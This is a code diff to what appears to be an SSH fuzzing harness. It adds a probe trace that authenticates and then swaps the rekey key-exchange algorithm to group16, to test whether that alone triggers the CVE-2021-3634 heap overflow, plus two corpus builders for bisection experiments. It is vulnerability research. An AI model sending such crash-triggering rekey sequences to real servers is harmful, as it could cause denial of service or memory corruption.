@@ -2579,6 +2579,144 @@ pub fn seed_client_attacker_rekey_dh_group16(server: AgentName) -> Trace<SshProt
     }
 }
 
+/// Tier-2 Q4 PROBE (not a catalogue witness): the CVE-2021-3634 witness with EXACTLY
+/// ONE change — the rekey KEX message is the ECDH `fn_kex_ecdh_init(fn_client_ecdh_pubkey)`
+/// (as in the honest `seed_client_attacker_rekey`) instead of `fn_kex_dh_init(...huge)`.
+/// So vs the honest corpus seed it differs by ONLY the rekey KEXINIT algo-name
+/// (`curve25519-sha256` -> `diffie-hellman-group16-sha512`). Executing it measures whether
+/// that single algo-name swap alone reaches the heap overflow: after negotiating group16 the
+/// server reads the 32-byte X25519 pubkey as a group16 `mpint e`. If it crashes, the
+/// honest->crash mutation distance is 1; if not, the witness's `fn_kex_dh_init` is also needed.
+pub fn seed_probe_rekey_g16_ecdhmsg(server: AgentName) -> Trace<SshProtocolTypes> {
+    let server_banner_id =
+        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
+    let server_kexinit = term! { (server, 0)[None]/SshMessage };
+    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
+    let server_ecdh_reply_raw =
+        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
+    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
+    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
+    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };
+
+    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };
+    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
+    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
+    let exch_hash = term! {
+        fn_kex_exchange_hash(
+            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
+            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
+        )
+    };
+    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
+    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
+
+    let svc_req = term! {
+        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
+    };
+    let sig = term! {
+        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
+    };
+    let auth_req = term! {
+        fn_encrypt_packet_aesgcm(
+            (fn_user_auth_request(
+                (fn_username), (fn_ssh_connection), (fn_method_publickey),
+                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
+            )),
+            (@key), (@iv), (fn_u32_auto))
+    };
+
+    // Rekey KEXINIT offers ONLY group16-sha512 (the single swap vs the honest seed).
+    let rekey_kexinit_msg = term! {
+        fn_kex_init(
+            (fn_cookie_zeros),
+            (fn_kex_algos((fn_namelist_1((fn_algo_dh_group16_sha512))))),
+            (fn_sig_schemes((fn_namelist_append((fn_namelist_1((fn_algo_rsa_sha2_512))), (fn_algo_rsa_sha2_256))))),
+            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
+            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
+            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
+            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
+            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
+            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
+        )
+    };
+    let rekey_kexinit = term! {
+        fn_encrypt_packet_aesgcm((@rekey_kexinit_msg), (@key), (@iv), (fn_u32_auto))
+    };
+    // UNCHANGED from the honest seed: ECDH KEX message (32-byte X25519 pubkey), NOT dh_init.
+    let rekey_kex_msg = term! {
+        fn_encrypt_packet_aesgcm(
+            (fn_kex_ecdh_init((fn_client_ecdh_pubkey))), (@key), (@iv), (fn_u32_auto))
+    };
+    let rekey_newkeys = term! {
+        fn_encrypt_packet_aesgcm((fn_new_keys), (@key), (@iv), (fn_u32_auto))
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![AgentDescriptor::from_config(
+            server,
+            SshDescriptorConfig {
+                typ: AgentType::Server,
+                try_reuse: false,
+                ..Default::default()
+            },
+        )],
+        steps: vec![
+            OutputAction::new_step(server),
+            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
+            OutputAction::new_step(server), // KEXINIT
+            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
+            InputAction::new_step(
+                server,
+                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
+            ),
+            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
+            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
+            InputAction::new_step(server, term! { @svc_req }),
+            OutputAction::new_step(server), // SERVICE_ACCEPT
+            InputAction::new_step(server, term! { @auth_req }),
+            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
+            InputAction::new_step(server, term! { @rekey_kexinit }),
+            OutputAction::new_step(server), // KEXINIT
+            InputAction::new_step(server, term! { @rekey_kex_msg }),
+            OutputAction::new_step(server), // KEX reply, NEWKEYS
+            InputAction::new_step(server, term! { @rekey_newkeys }),
+        ],
+        ..Default::default()
+    }
+}
+
+/// Tier-2 Q4 probe corpus: the single mid-path trace `seed_probe_rekey_g16_ecdhmsg`
+/// (honest rekey + ONLY the curve25519->group16 rekey-KEXINIT algo swap). Used to measure
+/// the mutation distance (`seed -c probe-midpath` then `execute`) and as the SOLE seed of
+/// the Q4 bisection campaign (`experiment -c probe-midpath`).
+pub fn create_probe_midpath_corpus(
+    _put: &dyn puffin::put_registry::Factory<SshProtocolBehavior>,
+) -> Vec<(Trace<SshProtocolTypes>, &'static str)> {
+    let client = AgentName::first();
+    let server = client.next();
+    vec![(
+        seed_probe_rekey_g16_ecdhmsg(server),
+        "seed_probe_rekey_g16_ecdhmsg",
+    )]
+}
+
+/// Tier-2 Q5 focused corpus: ONLY the honest `seed_client_attacker_rekey` (curve25519
+/// rekey, the exact non-crashing ancestor). Isolating it (vs the ~2000-entry
+/// `with-divergent` corpus) removes corpus dilution, so ~100% of mutations target the
+/// one seed that is a single `curve25519->group16` swap from the CVE-2021-3634 crash —
+/// a focused measurement of the undiluted organic rate (`experiment -c honest-rekey-only`).
+pub fn create_honest_rekey_only_corpus(
+    _put: &dyn puffin::put_registry::Factory<SshProtocolBehavior>,
+) -> Vec<(Trace<SshProtocolTypes>, &'static str)> {
+    let client = AgentName::first();
+    let server = client.next();
+    vec![(
+        seed_client_attacker_rekey(server),
+        "seed_client_attacker_rekey",
+    )]
+}
+
 /// Publickey "query, then sign" (RFC 4252 §7), the flow real clients use: first a
 /// USERAUTH_REQUEST WITHOUT signature asking whether key A is acceptable; the
 /// server answers USERAUTH_PK_OK echoing the algorithm and key blob; the client
